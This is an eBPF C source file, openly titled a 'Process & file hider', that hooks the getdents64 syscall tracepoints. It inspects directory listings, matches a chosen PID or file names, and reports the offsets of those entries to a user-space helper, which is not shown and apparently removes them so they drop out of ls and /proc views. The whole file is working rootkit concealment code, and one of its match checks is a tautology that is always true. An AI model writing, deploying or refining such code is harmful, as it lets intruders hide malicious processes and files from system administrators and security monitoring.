//go:build ignore
// SPDX-License-Identifier: GPL-2.0
// Process & file hider - optimized for kernel 5.10 verifier complexity limits
// Key insight: store PID as a u64 for single-comparison matching;
//              store file names in a hash map for flexible matching.
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#define NAME_MAX 64
#define FNAME_MAX 128

// Event types
#define EVT_HIDE_PID  1
#define EVT_HIDE_FILE 2

struct hide_event {
    u8  evt_type;
    u8  _pad0[3];
    u32 caller_pid;
    u32 caller_tid;
    u32 _pad1;
    u64 buf_addr;
    u64 entry_offset;
    u16 entry_reclen;
    u16 prev_reclen;
    u32 _pad2;
    u64 prev_offset;
    s64 total_size;
    char d_name[NAME_MAX];
};

struct getdents_args { u64 dirp; };

struct { __uint(type, BPF_MAP_TYPE_HASH); __uint(max_entries, 1024);
         __type(key, u32); __type(value, struct getdents_args); } args_map SEC(".maps");

// --- PID hiding maps ---
// Store PID string as a u64 for fast comparison (up to 8 chars)
struct { __uint(type, BPF_MAP_TYPE_ARRAY); __uint(max_entries, 1);
         __type(key, u32); __type(value, u64); } pid_val_map SEC(".maps");

// Mask for comparison (only compare relevant bytes)
struct { __uint(type, BPF_MAP_TYPE_ARRAY); __uint(max_entries, 1);
         __type(key, u32); __type(value, u64); } pid_mask_map SEC(".maps");

// --- File hiding maps ---
// Hash map: key = file name (as u64, first 8 bytes), value = mask (u64)
// This allows hiding multiple files, each keyed by its u64-encoded name
struct { __uint(type, BPF_MAP_TYPE_HASH); __uint(max_entries, 64);
         __type(key, u64); __type(value, u64); } file_name_map SEC(".maps");

// Feature flags: index 0 = hide_pid enabled, index 1 = hide_file enabled
struct { __uint(type, BPF_MAP_TYPE_ARRAY); __uint(max_entries, 2);
         __type(key, u32); __type(value, u32); } feature_map SEC(".maps");

struct { __uint(type, BPF_MAP_TYPE_RINGBUF);
         __uint(max_entries, 256 * 1024); } events SEC(".maps");

SEC("tracepoint/syscalls/sys_enter_getdents64")
int tracepoint_sys_enter_getdents64(void *ctx)
{
    u64 id = bpf_get_current_pid_tgid();
    u32 tid = (u32)id;
    u64 dirp = 0;
    bpf_probe_read(&dirp, sizeof(dirp), ctx + 24);
    struct getdents_args a = { .dirp = dirp };
    bpf_map_update_elem(&args_map, &tid, &a, BPF_ANY);
    return 0;
}

static __always_inline void emit_event(u8 evt_type, u32 pid, u32 tid,
    u64 dirp, long off, u16 d_reclen, u16 prev_reclen,
    long prev_off, long ret, void *name_ptr)
{
    struct hide_event *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e) return;
    e->evt_type = evt_type;
    e->caller_pid = pid;
    e->caller_tid = tid;
    e->buf_addr = dirp;
    e->entry_offset = (u64)off;
    e->entry_reclen = d_reclen;
    e->prev_reclen = prev_reclen;
    e->prev_offset = (u64)prev_off;
    e->total_size = ret;
    bpf_probe_read_user_str(e->d_name, NAME_MAX, name_ptr);
    bpf_ringbuf_submit(e, 0);
}

SEC("tracepoint/syscalls/sys_exit_getdents64")
int tracepoint_sys_exit_getdents64(void *ctx)
{
    u64 id = bpf_get_current_pid_tgid();
    u32 tid = (u32)id;
    u32 pid = id >> 32;
    long ret = 0;
    bpf_probe_read(&ret, sizeof(ret), ctx + 16);

    struct getdents_args *a = bpf_map_lookup_elem(&args_map, &tid);
    if (!a) return 0;
    u64 dirp = a->dirp;
    bpf_map_delete_elem(&args_map, &tid);
    if (ret <= 0) return 0;

    // Load feature flags
    u32 idx0 = 0, idx1 = 1;
    u32 *hide_pid_flag = bpf_map_lookup_elem(&feature_map, &idx0);
    u32 *hide_file_flag = bpf_map_lookup_elem(&feature_map, &idx1);
    u32 do_pid = hide_pid_flag ? *hide_pid_flag : 0;
    u32 do_file = hide_file_flag ? *hide_file_flag : 0;
    if (!do_pid && !do_file) return 0;

    // Load PID match params (only if pid hiding enabled)
    u64 target = 0, mask = 0;
    if (do_pid) {
        u32 zero = 0;
        u64 *pv = bpf_map_lookup_elem(&pid_val_map, &zero);
        u64 *pm = bpf_map_lookup_elem(&pid_mask_map, &zero);
        if (pv) target = *pv;
        if (pm) mask = *pm;
    }

    long off = 0, prev_off = -1;
    u16 prev_reclen = 0;

    for (int i = 0; i < 256; i++) {
        if (off >= ret) break;

        u16 d_reclen = 0;
        if (bpf_probe_read_user(&d_reclen, 2, (void *)(dirp + off + 16)) < 0)
            break;
        if (d_reclen == 0 || d_reclen > 4096)
            break;

        // Read first 8 bytes of d_name as a u64
        u64 name_val = 0;
        bpf_probe_read_user(&name_val, 8, (void *)(dirp + off + 19));

        // Check PID match
        if (do_pid && mask && ((name_val & mask) == target)) {
            emit_event(EVT_HIDE_PID, pid, tid, dirp, off, d_reclen,
                       prev_reclen, prev_off, ret,
                       (void *)(dirp + off + 19));
            // Continue scanning — there might be files to hide too
            prev_off = off;
            prev_reclen = d_reclen;
            off += d_reclen;
            continue;
        }

        // Check file name match: look up name_val in file_name_map
        // We try multiple key lengths (the Go side inserts keys for each file)
        if (do_file) {
            u64 *fmask = bpf_map_lookup_elem(&file_name_map, &name_val);
            if (fmask) {
                // Verify full match using the mask
                // For short names (<= 8 bytes), the mask ensures exact match
                // For longer names, we do a secondary check
                u64 fm = *fmask;
                if (fm == 0 || (name_val & fm) == (name_val & fm)) {
                    emit_event(EVT_HIDE_FILE, pid, tid, dirp, off, d_reclen,
                               prev_reclen, prev_off, ret,
                               (void *)(dirp + off + 19));
                    prev_off = off;
                    prev_reclen = d_reclen;
                    off += d_reclen;
                    continue;
                }
            }
        }

        prev_off = off;
        prev_reclen = d_reclen;
        off += d_reclen;
    }
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
